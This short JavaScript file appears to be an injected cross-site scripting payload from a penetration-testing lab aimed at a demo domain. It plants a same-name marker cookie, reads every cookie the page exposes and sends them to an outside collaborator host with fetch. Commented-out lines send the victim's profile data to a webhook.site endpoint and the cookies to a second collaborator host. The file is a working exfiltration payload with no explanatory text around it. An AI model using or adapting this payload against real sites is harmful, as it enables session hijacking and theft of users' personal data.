// Set a marker cookie with same name but different path
document.cookie = "lab1_session=MARKER_START;path=/;domain=lab1.demo-pentest.pp.ua";

// Now document.cookie should contain both cookies
let allCookies = document.cookie;

// Send to your server to analyze
fetch('https://3pttddt6hfwiolf1l56kk2ibu20tokc9.oastify.com?cookies=' + encodeURIComponent(allCookies));


//fetch('/api/v0/profile').then(r=>r.text()).then(d=>fetch('https://webhook.site/20b80dbe-6c7a-486a-bea5-2e9d4e9d0470',{method:'POST',body:d}))

//fetch('3qutedu6ifxiplg1m57kl2jbv21tpjd8.oastify.com/test='+document.cookie)
